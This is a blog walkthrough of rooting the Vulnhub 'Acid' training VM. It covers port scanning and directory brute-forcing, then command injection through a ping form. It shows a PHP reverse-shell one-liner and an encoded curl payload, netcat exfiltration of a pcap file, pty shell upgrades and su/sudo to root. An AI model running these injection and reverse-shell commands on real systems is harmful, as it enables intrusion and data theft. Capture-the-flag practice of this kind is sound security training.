Since [Fart knocker](https://maggick.fr/2015/06/vulnhub-fart-knocker.html)
in June I have worked on an other vulnhub machine:
[darknet](https://www.vulnhub.com/entry/darknet-10,120/). But this one is really
hard and get me stuck. I was a bit demotivated to continue vulnhub's machines but
I got some time this week, therefore I tried the
[Acid](https://www.vulnhub.com/entry/acid-server,125/) one.

<!-- PELICAN_END_SUMMARY -->

The goal is as usual, get root on the virtual machine. Let's go:

## Host Discovery

As always, we start with host discovery:
[Nmap](http://nmap.org) and [nikto](https://cirt.net/Nikto2) are our friends for
this step.

### nmap

We launch nmap against the virtual machine:

    :::text
    $ nmap 192.168.0.18 -p0-65535 -A -oA nmap
    Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:08 CEST
    Stats: 0:07:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 98.89% done; ETC: 12:15 (0:00:05 remaining)
    Nmap scan report for 192.168.0.18
    Host is up (0.0045s latency).
    Not shown: 65535 closed ports
    PORT      STATE SERVICE
    33447/tcp open  unknown
    |_http-title: /Challenge

    Service detection performed. Please report any incorrect results at
    http://nmap.org/submit/ .

We got a nice Apache web server with a simple splash screen. Notice the page
title: **/Challenge**.

### Nikto

I ran nikto on the target but nothing pop out.

## Web exploitation

### Page source

As we come pretty empty handed, we check the page source and two interesting
things came out:

  * Some hexadecimal code at the end of the page: 0x643239334c6d70775a773d3d
  * the title of the page (we can see it in the nmap scan) is /Challenge
    and there is an other web page at this address.

#### Hexa code

We will start with the first lead the hexadecimal code:

**0x643239334c6d70775a773d3d**

We convert it to string and we got:

**?d293LmpwZw==**

We decode the base64 and we got:

**wow.jpg**

We go to the url (the /images/ is given with the background image of the first
web page):

http://192.168.0.18:33447/images/wow.jpg

As a result we got a nice image that reward us for our success.

![wow.jpg](/media/2015.09/wow.jpg){: .image-process-article-image}

Yeah it seems to be some troll :)

### /Challenge

Let us dig the second lead: the page title. By adding `/Challenge` in the URL,
we land on an authentication interface.

I tried to use SQL injection but nothing. We will try
[dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
with the small dictionary (`/usr/share/dirbuster/directory-list-2.3-small.txt):

that the page title is one more time a folder: `/Magic_box`.

[dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
again:

    /Challenge/Magic_Box/proc/validate.php


    --------------------------------
We got some nice result mostly the `/command.php` page.

### Command execution

The page let us ping an other machine in the network. Nevertheless the page name
let us think that we can use command exploitation. If we add a `;` in the filed
and a command it seems to works, for instance with `; ls` we got (I use
[burp](http://releases.portswigger.net/) for all my pentest, the output of the
command is in the response page):

    :::text
    command.php
    command.php.save
    command2.php.save
    command2.php.save.1
    low.php
    proc
    tails.php

We can also read `/etc/passwd`: there is two users on the server: acid and
saman.

Let us try to get a reverse shell with that.

### reverse shell

As always, a good source of information is
[pentest monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

We know the site use php so we will try the php reverse shell first:

  * On the host we execute: `nc -l -p 6666`
  * On the target (via the ping interface) we query:
    `; php -r '$sock=fsockopen("192.168.0.13",6666);exec("/bin/sh -i <&3 >&3 2>&3");'`

It got us a shell on the machine (without tty/pty). But executing the request in the ping
interface each time we want the shell in painful, so I extract the curl command
from burp:

    :::text
    curl -i -s -k  -X 'POST' \
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0' -H 'DNT: 1' -H 'Referer: http://192.168.0.18:33447/Challenge/Magic_Box/command.php' -H 'Content-Type: application/x-www-form-urlencoded' \
        -b 'sec_session_id=2cdjrm9k6khpfiilsad1kmnpj2' \
        --data-binary $'IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&submit=submit' \
        'http://192.168.0.18:33447/Challenge/Magic_Box/command.php'

Now that we have a shell, let us see what we can do.

## Shell exploitation

First we discover what is at our disposal, mostly in the `/home/`
(`bash_history`). In the `/home/acid/` there is something interesting but
empty:

    ls -la /home/acid/.su*
    -rw-r--r-- 1 acid acid 0 Jul 31 17:27 /home/acid/.sudo_as_admin_successful

Let us see what else we got on the machine:

    $ ls /
    bin
    boot
    cdrom
    dev
    etc
    home
    initrd.img
    lib
    lost+found
    media
    mnt
    opt
    proc
    root
    run
    s.bin
    sbin
    srv
    sys
    tmp
    usr
    var
    vmlinuz
    $ ls /opt/
    $ ls /media
    acid
    floppy
    floppy0
    $ ls /s.bin
    investigate.php
    $ cat /s.bin/investigate.php
    <?php
    echo "Now you have to behave like an investigator to catch the culprit\n";
    ?

That is interesting the php file in `/s.bin/` clearly tell us to investigate.
But what we need know is a privilege escalation ti gain root access.

### Privilege escalation

I tried the overlayfs exploit (the same as with
[Fart knocker](https://maggick.fr/2015/06/vulnhub-fart-knocker.html))
without success:

  * I compiled the exploit on an other 32 bits virtual machine;
  * I transfered it to the shell via netcat;
  * And it failed:

    $ ./ofs.bin  : 4:
    spawning threads
    mount #1
    mount #2
    child threads done
    exploit failed

But we were given an hint.

### More investigations

The [pwnwiki.io](http://pwnwiki.io/#!privesc/linux/index.md) wiki is always a
good source of information. So with more investigation we look at bash_history,
search for `*txt*` files, an so on. Then `*pcap*` files:

    $ find / -name *pcap* 2>/dev/null
    /lib/modules/3.19.0-15-generic/kernel/drivers/rtc/rtc-pcap.ko
    /lib/modules/3.19.0-15-generic/kernel/drivers/input/misc/pcap_keys.ko
    /lib/modules/3.19.0-15-generic/kernel/drivers/input/touchscreen/pcap_ts.ko
    /lib/modules/3.19.0-15-generic/kernel/drivers/regulator/pcap-regulator.ko
    /sbin/raw_vs_isi/hint.pcapng
    /sbin/getpcaps
    /sys/bus/spi/drivers/ezx-pcap
    /usr/share/doc/libpcap0.8
    /usr/share/mime/application/vnd.tcpdump.pcap.xml
    /usr/share/man/man7/pcap-filter.7.gz
    /usr/share/man/man1/getpcaps.1.gz
    /usr/lib/i386-linux-gnu/libpcap.so.1.6.2
    /usr/lib/i386-linux-gnu/libpcap.so.0.8
    /usr/src/linux-headers-3.19.0-15/include/linux/mfd/ezx-pcap.h

    /usr/src/linux-headers-3.19.0-15-generic/include/config/input/pcap.h
    /usr/src/linux-headers-3.19.0-15-generic/include/config/regulator/pcap.h
    /var/lib/dpkg/info/libpcap0.8:i386.postinst
    /var/lib/dpkg/info/libpcap0.8:i386.shlibs
    /var/lib/dpkg/info/libpcap0.8:i386.postrm
    /var/lib/dpkg/info/libpcap0.8:i386.md5sums
    /var/lib/dpkg/info/libpcap0.8:i386.symbols
    /var/lib/dpkg/info/libpcap0.8:i386.list

Yes `/sbin/raw_vs_isi/hint.pcapng`!

### pcap

We transfer the file with netcat:

  * On our attack machine: `nc -lp 1234 > pcap`
  * On the server: `nc 192.168.0.13 1234 < /sbin/raw_vs_isi/hint.pcapng`

We open the pcap file with [wireshark](https://www.wireshark.org/). There is a
lot of information in this file, over 6 000 trams.
On the 6 212 we notice some sort of text. By following the TCP stream (wireshark
function) we discover what seems to be a chat exchange:

> heya
>
> hello
> What was the name of the Culprit ???
>
> saman and now a days he's known by the alias of 1337hax0r
>
> oh...Fuck....Great...Now, we gonna Catch Him Soon :D
>
> Yes .. We have to !! The mad bomber is on a rage
>
> Ohk...cya
>
> Over and Out

Great, what does it means? We know that saman is one of the user on the machine.
Maybe we got some hints about it password or something like that.

### interactive shell

In order to execute a su, we need a interactive shell (with
[pty/tty](https://en.wikipedia.org/wiki/Pseudoterminal)).
Once more [pentest monkey](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
will help us:

    python -c 'import pty; pty.spawn("/bin/sh")'

As `/bin/sh` is a symlink to dash, we directly use bash:

    python -c 'import pty; pty.spawn("/bin/bash")'

We now need to try to connect as saman.

## Saman

With our beautiful shell we jut have to `su saman` to try to connect as saman:

    www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman
    su saman
    Password: 1337hax0r

It works! Let us try `sudo su`:

    saman@acid:/var/www/html/Challenge/Magic_Box$ sudo su
    sudo su
    [sudo] password for saman: 1337hax0r
    root@acid:/var/www/html/Challenge/Magic_Box# cat /root/flag.txt
    cat /root/flag.txt


    Dear Hax0r,


    You have successfully completed the challenge.

    I  hope you like it.


    FLAG NAME: "Acid@Makke@Hax0r

## Conclusion

It was a nice box to root but as I read the other write up it seems that my way
was not the one expected.
Nevertheless, thank to [Avinash Kumar Thapa](https://twitter.com/m_avinash143)
for the box and [vulnhub](https://twitter.com/VulnHub).
